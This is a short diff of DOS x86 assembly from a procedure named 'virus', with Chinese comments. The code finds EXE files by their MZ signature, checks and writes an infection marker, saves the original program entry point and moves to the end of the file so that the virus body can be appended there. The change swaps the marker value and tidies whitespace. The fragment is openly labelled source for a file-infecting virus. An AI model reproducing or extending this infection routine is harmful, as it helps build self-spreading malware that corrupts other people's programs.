@@ -83,10 +83,10 @@ virus proc
               cmp  word ptr [si],5a4dh         ;检查是否是exe,5a4d为文件的标识
               jnz  next_file
 ;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!病毒标识，需要更改
-              cmp  word ptr [si+2ah],8888h     ;检查是否已被感染
+              cmp  word ptr [si+2ah],6666h     ;检查是否已被感染
               je   next_file
 
-              mov  word ptr [si+2ah],8888h
+              mov  word ptr [si+2ah],6666h
 
               mov  ax,word ptr [si+014h]       ;保存原程序入口;;表示14-15H: b.exe 被载入后 IP 的初值是
               mov  word ptr [si+02eh],ax       ;保存信息在head
@@ -98,7 +98,7 @@ virus proc
                                                 ;移动指针到文件尾，病毒代码插入到尾部
                                                 ;返回：CF=0成功,DX:AX=新的文件指针
               int  21h
-              
+
               push ax                           ;存一下AA.exe文件末尾的位置
               sub  ax,200h
               mov  cx,ax
